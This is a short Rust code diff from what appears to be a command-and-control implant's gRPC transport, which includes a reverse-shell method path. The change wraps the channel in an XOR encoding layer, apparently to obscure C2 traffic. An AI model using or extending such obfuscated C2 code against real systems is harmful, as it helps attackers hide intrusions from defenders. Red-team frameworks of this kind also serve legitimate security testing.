@@ -1,3 +1,4 @@
+use crate::crypto::CryptoSvc;
 use crate::Transport;
 use anyhow::Result;
 use hyper::Uri;
@@ -7,6 +8,7 @@ use std::sync::mpsc::{Receiver, Sender};
 use tonic::codec::ProstCodec;
 use tonic::GrpcMethod;
 use tonic::Request;
+use tower::ServiceBuilder;
 
 use std::time::Duration;
 
@@ -20,7 +22,7 @@ static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 
 #[derive(Debug, Clone)]
 pub struct GRPC {
-    grpc: tonic::client::Grpc<tonic::transport::Channel>,
+    grpc: tonic::client::Grpc<crate::xor::XorSvc>,
 }
 
 impl Transport for GRPC {
@@ -48,6 +50,10 @@ impl Transport for GRPC {
                 .rate_limit(1, Duration::from_millis(25))
                 .connect_lazy(),
         };
+
+        let channel = ServiceBuilder::new()
+            .layer_fn(crate::xor::XorSvc::new)
+            .service(channel);
 
         let grpc = tonic::client::Grpc::new(channel);
         Ok(Self { grpc })
